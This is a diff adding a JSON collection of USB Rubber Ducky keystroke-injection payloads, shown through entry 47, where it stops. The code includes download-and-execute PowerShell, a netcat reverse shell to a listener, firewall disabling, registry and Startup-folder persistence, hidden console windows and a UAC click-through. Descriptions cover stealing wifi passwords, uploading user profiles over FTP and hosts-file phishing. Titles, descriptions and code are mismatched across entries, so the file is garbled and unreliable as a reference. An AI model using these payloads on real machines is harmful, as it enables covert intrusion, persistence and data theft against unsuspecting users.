@@ -1,0 +1,548 @@
+[
+  {
+    "Title": "Hello World (Windows)",
+    "Id": 2,
+    "Description": "For testing functionality.",
+    "Code": "DELAY 3000\nGUI r\nDELAY 500\nSTRING notepad\nDELAY 500\nENTER\nDELAY 750\nSTRING Hello World!!!\nENTER\n"
+  },
+  {
+    "Title": "Hide cmd window (Windows)",
+    "Id": 3,
+    "Description": "The following is an example of how to hide the command window below the bottom of the screen while typing in commands. The window movement part of the script can also be used on any other window. CMD.exe is also run with some command line flags for changing the appearance of the window to make it harder to view, and also a flag that turns on delayed expansion in the command prompt which allows for variable names to be called more than once in a line with no adverse effects. Example: SET Something = Something + Something_Else",
+    "Code": "REM Target: WINDOWS VISTA/7\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Basic Terminal Commands (Ubuntu)",
+    "Id": 4,
+    "Description": "The following is an attempt to create a hide CMD window script that uses a key combo to run as administrator when UAC is turned on.",
+    "Code": "REM Target: WINDOWS VISTA\nREM Encoder V2.4\nREM Purpose: Hide cmd window script that uses a key combo to circumvent UAC limitations.\nDELAY 3000\nCONTROL ESCAPE\nDELAY 500\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nCTRL-SHIFT ENTER\nDELAY 1000\nALT C\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Mobiletabs (Windows)",
+    "Id": 5,
+    "Description": "Other windows can be hidden also, as demonstrated in this powershell hide, get, and execute.",
+    "Code": "REM Target: WINDOWS VISTA/7\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://example.com/bob.old&#39;,&#39;%TEMP%\\bob.exe&#39;); Start-Process &#34;%TEMP%\\bob.exe&#34;\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Generic batch",
+    "Id": 6,
+    "Description": "Windows can also be hidden on other sides of the screen example: replace DOWNARROW with RIGHTARROW, LEFTARROW, UPARROW.",
+    "Code": "DELAY 3000\nALT F2\nDELAY 500\nSTRING xterm\nDELAY 500\nENTER\nDELAY 750\nSTRING pwd\nDELAY 500\nENTER\nDELAY 300\nSTRING id\nDELAY 300\nENTER\nDELAY 500\nSTRING cat /etc/passwd\nDELAY 500\nENTER\n"
+  },
+  {
+    "Title": "Run exe from SD",
+    "Id": 7,
+    "Description": "The following script is an example of how to execute commands in Ubuntu Linux through xterm. The script first initiates the run application window through ubuntu and later on it triggers the command xterm. After the execution of the terminal it issues the commands &ldquo;pwd&rdquo;, &ldquo;id&rdquo; and &ldquo;cat /etc/passwd&rdquo;.",
+    "Code": "GUI r\nSTRING cmd /Q /D /T:0a /F:OFF /V:OFF /K\nDELAY 500\nENTER\nDELAY 750\nREM DELETE THE SCRIPT IF IT ALREADY EXISTS\nSTRING DEL /Q MobileTabs.vbs\nENTER\nREM VB SCRIPT FOUND AT:\nREM http://www.vistaheads.com/forums/microsoft-public-internetexplorer-general/438407-command-line-open-several-websites-multiple-tabs.htmlinternetexplorer\nREM INPUT FILE MobileTabs.vbs\nSTRING copy con MobileTabs.vbs\nENTER\nSTRING on error resume next\nENTER\nSTRING navOpenInBackgroundTab = &amp;h1000\nENTER\nSTRING set oIE = CreateObject(&#34;InternetExplorer.Application&#34;)\nENTER\nSTRING Set args = WScript.Arguments\nENTER\nSTRING oIE.Navigate2 args.Item(0)\nENTER\nSTRING for intx = 1 to args.count\nENTER\nSTRING oIE.Navigate2 args.Item(intx), navOpenInBackgroundTab\nENTER\nSTRING next\nENTER\nSTRING oIE.Visible = true\nENTER\nCONTROL z\nENTER\nREM RUN THE VB SCRIPT TO LAUNCH INTERNET EXPLORER\nREM THE DOUBLE QUOTES BECOME MORE IMPORTANT FOR LONGER URLs\nSTRING MobileTabs.vbs &#34;http://www.google.com/&#34; &#34;http://mwomercs.com/&#34; &#34;http://hak5.org/&#34; &#34;http://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/&#34;\nENTER\n"
+  },
+  {
+    "Title": "Run java from SD",
+    "Id": 8,
+    "Description": "Types in a VB script that sends command line arguments to internet explorer and opens new tabs based on the URLs you specify via command line.",
+    "Code": "REM Target: WINDOWS VISTA/7\nREM ADMIN PRIVILEGES\nREM PURPOSE: to create a script that types in a generic batch file and executes siletntly.\nREM Using the run command for a broader OS base.\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\nREM Make batch file.\nREM Delete batch file if already exists.\nSTRING erase /Q batch.bat\nENTER\nREM Make the batch file.\nSTRING copy con batch.bat\nENTER\nREM Registry key that restarts script on reboot.\nSTRING REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d &#34;wscript.exe %TEMP%\\invis.vbs %TEMP%\\batch.bat&#34; /f\nENTER\nREM Copy invis.bat to another location\nSTRING move invis.vbs %TEMP%\nENTER\nREM Copy current program to another location.\nSTRING move %0 %TEMP%\nENTER\nREM Continue batch file contents here. . .\nCONTROL z\nENTER\nREM Make the VBS file that allows running invisibly.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL z\nENTER\nSTRING wscript.exe invis.vbs batch.bat\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": "Copy file to Desktop",
+    "Id": 9,
+    "Description": "A generic batch payload with built in persistence via registry key. Only runs as advertised on admin accounts.",
+    "Code": "REM Author: overwraith\nREM Name: RunEXE.txt\nREM Purpose: Run an executable file off of the SD card after it mounts.\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDEFAULT_DELAY 25\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "EICAR AV test (Windows)",
+    "Id": 10,
+    "Description": "The following is a payload I have been working on that waits until a drive labeled &ldquo;DUCKY&rdquo; is mounted. I have used some of midnightsnake&rsquo;s code in this payload. The name of the file that is run can be changed to .exe, I am just having it run a batch for testing purposes. The line that says &ldquo;STRING START %myd%\\myEXE.bat&rdquo; is the line that executes the executable.",
+    "Code": "REM Change directories because System32 appears to be protected.\nSTRING CD %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Download/Upload",
+    "Id": 11,
+    "Description": "The following is the batch file that is run after the &ldquo;DUCKY&rdquo; drive has been mounted. Everything is being run invisibly, so you will need to check for the existence of &ldquo;Message.txt&rdquo; which will probably be in &ldquo;C:\\Windows\\system32&rdquo;.",
+    "Code": "REM Make batch file that waits for SD card to mount.\nREM Delete batch file if already exists\nSTRING erase /Q DuckyWait.bat\nENTER\nSTRING copy con DuckyWait.bat\nENTER\nREM DuckyWait.bat\nSTRING :while1\nENTER\nSTRING for /f %%d in (&#39;wmic volume get driveletter^, label ^| findstr &#34;DUCKY&#34;&#39;) do set myd=%%d\nENTER\nSTRING if Exist %myd% (\nENTER\nSTRING goto :break\nENTER\nSTRING )\nENTER\nSTRING timeout /t 30\nENTER\nSTRING goto :while1\nENTER\nSTRING :break\nENTER\nREM Continue script.\nSTRING START %myd%\\HelloWorld.exe\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Netcat Reverse Shell (Windows)",
+    "Id": 12,
+    "Description": "The encoders now support the repeat command, so should only be a problem if you are using an old encoder. Encoders also now support white space in the duck script, so functions have been separated with white space.",
+    "Code": "REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL Z\nENTER\n"
+  },
+  {
+    "Title": "Downloader (Windows)",
+    "Id": 13,
+    "Description": "The following is a newer version of the RunEXE from SD payload which uses googleknowsbest&rsquo;s method for finding the &ldquo;DUCKY&rdquo; drive, which is more portable than the previous version&rsquo;s method. This version should work on all current Windows versions. (XP, Vista, 7).",
+    "Code": "REM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs DuckyWait.bat\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": "FTP download/upload (Windows)",
+    "Id": 14,
+    "Description": "The following is another take on the RunEXE from SD payload, I think the micro SD connection is faster than it used to be, it could just be me. Here I am using a special for loop which uses the &lsquo;Vol&rsquo; command for volume information. I am pretty sure it runs on most Windows boxes, and am reasonably sure it runs on most old computers. The main reason for the revamp is to eliminate some of the problems associated with the &lsquo;diskpart&rsquo; command, which if run on a non admin box will cause previous scripts to essentially hang.",
+    "Code": "REM Message.txt\necho Hello Wolrd!!!\necho Hello World!!! &gt; Message.txt\n"
+  },
+  {
+    "Title": "Powershell wget execute (Windows)",
+    "Id": 15,
+    "Description": "The following is another payload for running applications on Twin duck firmware from off your SD card automatically. This payload waits for the ducky drive to mount, then switches to the directory containing the Java payload, then launches the payload. I don&rsquo;t know how useful this will be, but it is here if you need it. This only runs on Windows systems, but should run on all current Windows thanks to some code written by googleknowsbest. Change &ldquo;JavaApp&rdquo; to the name of your application.",
+    "Code": "REM Author: overwraith\nREM Name: RunEXE_V2.txt\nREM Purpose: Run an executable file off of the SD card after it mounts. Uses googleknowsbest&#39;s slightly more portable method to find the &#34;Ducky&#34; drive.\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDEFAULT_DELAY 75\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Download and execute file with Powershell (Windows)",
+    "Id": 16,
+    "Description": "If you are not containing this script and the application within a folder on the ducky drive, then remove this line:",
+    "Code": "REM Change directories because System32 appears to be protected.\nSTRING CD %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Wget and execute (OSX)",
+    "Id": 17,
+    "Description": "The following is something I have been working on based on the payload &ldquo;Runexe from SD&rdquo;. This payload will work on the twin duck firmwares by executing a script that waits for the ducky to mount the removable storage. The payload also uses some of the member googleknowsbest&rsquo;s code. The for loop which polls for the ducky is the code to which I am referring to. This payload is not hacking related per say, but it could be useful to those who miss autorun files, and sneaker nets.",
+    "Code": "REM Make batch file that waits for SD card to mount.\nREM Delete batch file if already exists\nSTRING erase /Q DuckyWait.bat\nENTER\nSTRING copy con DuckyWait.bat\nENTER\nREM DuckyWait.bat\nSTRING :while1\nENTER\nSTRING for /f &#34;tokens=3 delims= &#34; %%A in (&#39;echo list volume ^| diskpart ^| findstr &#34;DUCKY&#34;&#39;) do (set DUCKYdrive=%%A:)\nENTER\nSTRING if Exist %DUCKYdrive% (\nENTER\nSTRING goto :break\nENTER\nSTRING )\nENTER\nSTRING timeout /t 30\nENTER\nSTRING goto :while1\nENTER\nSTRING :break\nENTER\nREM Continue script.\nSTRING START %DUCKYdrive%\\HelloWorld.exe\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Reverse shell (Windows)",
+    "Id": 18,
+    "Description": "There is a group of lines you may wish to remove if you are operating from the root of the ducky, I have the script running out of a folder on the ducky, not the root.",
+    "Code": "REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL Z\nENTER\n"
+  },
+  {
+    "Title": "Fork bomb (Windows)",
+    "Id": 19,
+    "Description": "The script copies HelloWorld.exe out of the folder &ldquo;CopyFileToDesktop&rdquo;.",
+    "Code": "REM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs DuckyWait.bat\nENTER\nREM STRING EXIT\nREM ENTER\n"
+  },
+  {
+    "Title": "Utilman exploit (Windows)",
+    "Id": 20,
+    "Description": "Netcat FTP download and reverse shell (Windows)",
+    "Code": "REM Author: overwraith\nREM Name: RunEXE_V3.txt\nREM Purpose: Run an executable file off of the SD card after it mounts. Uses a slightly different version of the drive finder code.\nREM Encoder V2.4+\nREM Using the run command for a broader OS base.\nDEFAULT_DELAY 75\nDELAY 3000\nGUI R\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Disable Windows Defender (Windows)",
+    "Id": 21,
+    "Description": "This script will:",
+    "Code": "REM Change directories because System32 appears to be protected.\nSTRING CD %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Wifi backdoor (Windows)",
+    "Id": 22,
+    "Description": "Fill in the required information where you see the brackets.",
+    "Code": "REM Make batch file that waits for SD card to mount.\nREM Delete batch file if already exists\nSTRING erase /Q DuckyWait.bat\nENTER\nSTRING copy con DuckyWait.bat\nENTER\nREM DuckyWait.bat\nSTRING :while1\nENTER\nSTRING for %%d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do (\nENTER\nSTRING for /f &#34;tokens=6 delims= &#34; %%i in (&#39;Vol %%d:&#39;) do (\nENTER\nSTRING if &#34;%%i&#34; EQU &#34;DUCKY&#34; ( set &#34;DuckyDrive=%%d:&#34; )\nENTER\nSTRING )\nENTER\nSTRING )\nENTER\nSTRING if Exist %DuckyDrive% (\nENTER\nSTRING goto :break\nENTER\nSTRING )\nENTER\nSTRING timeout /t 30\nENTER\nSTRING goto :while1\nENTER\nSTRING :break\nENTER\nREM Continue script.\nSTRING START %DuckyDrive%\\HelloWorld.exe\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Wifun (Windows)",
+    "Id": 23,
+    "Description": "Change the following details:",
+    "Code": "REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL Z\nENTER\n"
+  },
+  {
+    "Title": "Create wireless (auto-connect) network association (Windows)",
+    "Id": 24,
+    "Description": "Opens the command prompt (not as administrator) creates a VBscript to download a file from any URL. Downloads a file and executes it. Useful for downloading small .exe files from a web server and executing them.",
+    "Code": "REM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs DuckyWait.bat\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": "MissDirection",
+    "Id": 25,
+    "Description": "Example:",
+    "Code": "REM Author: overwraith\nREM Name: Java_Application.txt\nREM Purpose: Run a java application off the ducky drive after it mounts.\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDEFAULT_DELAY 25\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Local DNS poisoning (Windows)",
+    "Id": 26,
+    "Description": "This script downloads WinSCP and uploads the user profile, recursive, to a FTP server.",
+    "Code": "REM Change directories because System32 appears to be protected.\nSTRING CD %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Local DNS poisoning (OSX)",
+    "Id": 27,
+    "Description": "Opens “RUN” box, throws power shell string, enter. Supports HTTP/S, and proxies.",
+    "Code": "REM Make batch file that waits for SD card to mount.\nREM Delete batch file if already exists\nSTRING erase /Q DuckyWait.bat\nENTER\nSTRING copy con DuckyWait.bat\nENTER\nREM DuckyWait.bat\nSTRING :while1\nENTER\n"
+  },
+  {
+    "Title": "Phisher (Windows)",
+    "Id": 28,
+    "Description": "NOTE: -windowstyle hidden hides the powershell window. Also mind the escaped quotes around $env:temp, otherwise the environment variable won&rsquo;t expand.",
+    "Code": "STRING for /f &#34;tokens=3 delims= &#34; %%A in (&#39;echo list volume ^| diskpart ^| findstr &#34;DUCKY&#34;&#39;) do (set DUCKYdrive=%%A:)\nENTER\nSTRING if Exist %DUCKYdrive% (\nENTER\nSTRING goto :break\nENTER\nSTRING )\nENTER\nSTRING timeout /t 30\nENTER\nSTRING goto :while1\nENTER\nSTRING :break\nENTER\nREM Continue script.\nSTRING %DUCKYdrive%\nENTER\nSTRING cd Java_Application\nENTER\nSTRING Java JavaApp\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Remotely Possible (Windows)",
+    "Id": 29,
+    "Description": "This is an improved version for the code above.",
+    "Code": "REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Root backdoor (OSX)",
+    "Id": 30,
+    "Description": "Full Example with Jar:",
+    "Code": "REM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs DuckyWait.bat\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": "User backdoor (OSX)",
+    "Id": 31,
+    "Description": "Opens administrative CMD prompt, creates decoder.vbs containing code to convert base64 encoded ascii to binary, creates text file including base64 ascii of binary file to create reverse shell. converts second file to exe with first file. Executes with host and port parameters.",
+    "Code": "STRING cd Java_Application\nENTER\n"
+  },
+  {
+    "Title": "Passwordless SSH access (OSX)",
+    "Id": 32,
+    "Description": "Receive reverse shell with netcat. For example:",
+    "Code": "REM Author: overwraith\nREM Name: CopyFileToDesktop.txt\nREM Purpose: Wait for ducky mass storage to mount, then copy file to desktop.\nREM Encoder V2.4\nREM Using the run command for a broader OS base.\nDEFAULT_DELAY 75\nDELAY 3000\nGUI r\nDELAY 1000\nSTRING cmd /Q /D /T:7F /F:OFF /V:ON /K\nDELAY 500\nENTER\nDELAY 750\nALT SPACE\nSTRING M\nDOWNARROW\nREPEAT 100\nENTER\n"
+  },
+  {
+    "Title": "Chrome password stealer (Windows)",
+    "Id": 33,
+    "Description": "Opens a command prompt as administrator with run, uses con copy to create fork bomb batch(if you don’t know what this is then see: http://en.wikipedia.org/wiki/Fork_bomb). Then saves the .bat file under the start up program folder and runs it the first time.",
+    "Code": "REM Change directories because System32 appears to be protected.\nSTRING CD %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Wifi password grabber (Windows)",
+    "Id": 34,
+    "Description": "Uses the Utilman.exe Exploit to create a new local administrator account “Local000” with the password “hak5”.",
+    "Code": "REM Make batch file that waits for SD card to mount.\nREM Delete batch file if already exists\nSTRING erase /Q DuckyWait.bat\nENTER\nSTRING copy con DuckyWait.bat\nENTER\nREM DuckyWait.bat\nSTRING :while1\nENTER\nSTRING for /f &#34;tokens=3 delims= &#34; %%A in (&#39;echo list volume ^| diskpart ^| findstr &#34;DUCKY&#34;&#39;) do (set DUCKYdrive=%%A:)\nENTER\nSTRING if Exist %DUCKYdrive% (\nENTER\nSTRING goto :break\nENTER\nSTRING )\nENTER\nSTRING timeout /t 30\nENTER\nSTRING goto :while1\nENTER\nSTRING :break\nENTER\nREM Continue script.\nREM Remove the next two lines if you don&#39;t place your payloads in separate folders.\nSTRING set DUCKYdrive=%DUCKYdrive%\\CopyFileToDesktop\\\nENTER\nSTRING copy %DUCKYdrive%HelloWorld.exe %userprofile%\\Desktop\\HelloWorld.exe\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Information gathering (Ubuntu)",
+    "Id": 35,
+    "Description": "Open a CMD bypassing UAC then create a wireless access point with the SSID noobcake and WPA key 12345678, then lower firewall.",
+    "Code": "REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.\nREM Delete vbs file if already exists\nSTRING erase /Q invis.vbs\nENTER\nREM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up\nSTRING copy con invis.vbs\nENTER\nSTRING CreateObject(&#34;Wscript.Shell&#34;).Run &#34;&#34;&#34;&#34; &amp; WScript.Arguments(0) &amp; &#34;&#34;&#34;&#34;, 0, False\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Internet Protocol Slurp (OSX)",
+    "Id": 36,
+    "Description": "This script will enter the command shell as administrator, disable the firewall and export the wifi settings then send to an ftp server of your choice. the cool part is that the security is exported in clear text. After sending the file it will delete the exports from the sending directory and restore the firewall.",
+    "Code": "REM RUN THE BATCH FILE\nSTRING wscript.exe invis.vbs DuckyWait.bat\nENTER\nSTRING EXIT\nENTER\n"
+  },
+  {
+    "Title": "iMessage Capture (OSX)",
+    "Id": 37,
+    "Description": "Payload will edit the hosts file to allow you to redirect web pages where you would like the user to go.",
+    "Code": "REM Remove the next two lines if you don&#39;t place your payloads in separate folders.\nSTRING set DUCKYdrive=%DUCKYdrive%\\CopyFileToDesktop\\\nENTER\n"
+  },
+  {
+    "Title": "Auto defacer (Apache)",
+    "Id": 38,
+    "Description": "Used for phishing, it add&rsquo;s an ip of your choosing to the hosts file on windows so when the user types into web browser for example www.facebook.com, instead of going to the proper ip it goes to the ip in the host file.",
+    "Code": "DEFAULTDELAY 500\nGUI r\nSTRING notepad.exe\nENTER\nSTRING X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\nCTRL s\nSTRING %USERPROFILE%\\desktop\\eicar.com\nENTER\nALT F4\n"
+  },
+  {
+    "Title": "Batch wiper drive eraser (Windows)",
+    "Id": 39,
+    "Description": "Script for turning off the firewall, adding a user, making it an administrator, enabling remote access and sending (by FTP) the IP number to a server of your choice, then deleting the file.",
+    "Code": "DELAY 10000\nGUI r\nDELAY 200\nSTRING cmd\nENTER\nDELAY 600\nSTRING cd %USERPROFILE%\nENTER\nDELAY 100\nSTRING netsh firewall set opmode disable\nENTER\nDELAY 2000\nSTRING echo open [IP] [PORT] &gt; ftp.txt\nENTER\nDELAY 100\nSTRING echo [USERNAME]&gt;&gt; ftp.txt\nENTER\nDELAY 100\nSTRING echo [PASSWORD]&gt;&gt; ftp.txt\nENTER\nDELAY 100\nSTRING echo bin &gt;&gt; ftp.txt\nENTER\nDELAY 100\nSTRING echo get nc.exe &gt;&gt; ftp.txt\nENTER\nDELAY 100\nSTRING echo bye &gt;&gt; ftp.txt\nENTER\nDELAY 100\nSTRING ftp -s:ftp.txt\nENTER\nSTRING del ftp.txt &amp; exit\nENTER\nDELAY 2000\nGUI r\nDELAY 200\nSTRING nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d\nENTER\nDELAY 2000\nGUI r\nDELAY 200\nSTRING cmd\nENTER\nDELAY 600\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": "Deny net access (Windows)",
+    "Id": 40,
+    "Description": "Catch the shell with netcat:",
+    "Code": "REM Title: Netcat Reverse Shell\nREM Author: Kanishk Singh\nREM Version: 1\nREM Description:\nDELAY 200\nREM --&gt; Minimize all windows\nWINDOWS d\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb RunAs\nENTER\nDELAY 1500\nALT y\nDELAY 500\nSTRING cd %TEMP%\nENTER\n"
+  },
+  {
+    "Title": "Website Lock (Windows)",
+    "Id": 41,
+    "Description": "Catch the shell with netcat:",
+    "Code": "REM --&gt; Kills already running Netcat instance (if any)\nSTRING TASKKILL /im nc.exe /f\nENTER\nREM --&gt; Delete nc.exe file if it already exists\nSTRING erase /Q nc.exe\nENTER\nREM --&gt; Delete Start batch file if it already exists\nSTRING erase /Q Start.bat\nENTER\nREM --&gt; Delete Invisible.vbs in temp folder, if it already exists\nSTRING erase /Q invisible.vbs\nENTER\nREM --&gt; Delete invisible.vbs file in Startup if it already exists\nSTRING erase /Q &#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\invisible.vbs&#34;\nENTER\nDELAY 500\n"
+  },
+  {
+    "Title": "Ugly rolled (Windows)",
+    "Id": 42,
+    "Description": "Replace RSA_PUB_ID with your SSH Public Key.",
+    "Code": "REM --&gt; Downloads NetCat\nSTRING powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://[NETCAT_DOWNLOAD_LINK]/nc.exe&#39;,&#39;nc.exe&#39;)\nENTER\nDELAY 500\n"
+  },
+  {
+    "Title": "Wallpaper (Windows7)",
+    "Id": 43,
+    "Description": "Google Chrome Version 36.0.1985.143 and below: Any version above is patched and requires user password.",
+    "Code": "REM --&gt; Creates a batch file to start listening\nSTRING copy con Start.bat\nENTER\nSTRING nc -lp [PORT] -vv -e cmd.exe -L\nENTER\nCONTROL z\nENTER\n"
+  },
+  {
+    "Title": "Paint Hack (Windows)",
+    "Id": 44,
+    "Description": "Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account. Change the following things;",
+    "Code": "REM --&gt; Starts batch file invisibly\nSTRING copy con invisible.vbs\nENTER\nSTRING Set WshShell = CreateObject(&#34;WScript.Shell&#34; )\nENTER\nSTRING WshShell.Run chr(34) &amp; &#34;%TEMP%\\Start.bat&#34; &amp; Chr(34), 0\nENTER\nSTRING Set WshShell = Nothing\nENTER\nCONTROL z\nENTER\nREM --&gt; Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly\nSTRING netsh advfirewall firewall add rule name=&#34;Netcat&#34; dir=in action=allow program=&#34;%TEMP%\\nc.exe&#34; enable=yes\nENTER\nSTRING start invisible.vbs\nENTER\nDELAY 100\n"
+  },
+  {
+    "Title": "You got quacked! (Windows)",
+    "Id": 45,
+    "Description": "The following script is an information gatherer script which collects info from a running Ubuntu OS and saves it to a file named &ldquo;info_gathering.txt&rdquo;. The info that the script retrieves is the logged in username, the distribution and kernel version of the running system, the applicability of the shellsock bug, the mounted filesystems, information which is related to the Network adapters, availability of development tools (python, g++), contents of the hosts file and the listening TCP/UDP connections. Apart from that it attempts to find readable folders inside the /etc folder and also prints the SUID and GUID files.",
+    "Code": "REM --&gt; Copies invisible.vbs to startup folder for persistence\nSTRING copy &#34;invisible.vbs&#34; &#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp&#34;\nENTER\nREM --&gt; Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": "Restart (Windows)",
+    "Id": 46,
+    "Description": "This payload quickly copies down information gathered from terminal&rsquo;s command ifconfig and pastes it in a file called “default_config” (So there is no suspicion) in the Documents folder. This payload also quickly cleans up after itself allowing for a 10 second stealth slurp. If need be you may change the command “ifconfig” to any other command such as “ls” or others.",
+    "Code": "ESCAPE\nCONTROL ESCAPE\nDELAY 400\nSTRING cmd\nDELAY 400\nENTER\nDELAY 400\nSTRING copy con download.vbs\nENTER\nSTRING Set args = WScript.Arguments:a = split(args(0), &#34;/&#34;)(UBound(split(args(0),&#34;/&#34;)))\nENTER\nSTRING Set objXMLHTTP = CreateObject(&#34;MSXML2.XMLHTTP&#34;):objXMLHTTP.open &#34;GET&#34;, args(0), false:objXMLHTTP.send()\nENTER\nSTRING If objXMLHTTP.Status = 200 Then\nENTER\nSTRING Set objADOStream = CreateObject(&#34;ADODB.Stream&#34;):objADOStream.Open\nENTER\nSTRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0\nENTER\nSTRING Set objFSO = Createobject(&#34;Scripting.FileSystemObject&#34;):If objFSO.Fileexists(a) Then objFSO.DeleteFile a\nENTER\nSTRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing\nENTER\nSTRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing\nENTER\nCTRL z\nENTER\nSTRING cscript download.vbs &lt;INSERT URL HERE&gt;\nENTER\nSTRING &lt;INSERT EXE FILENAME HERE&gt;\nENTER\nSTRING exit\nENTER\n"
+  },
+  {
+    "Title": "Screen rotate (Windows)",
+    "Id": 47,
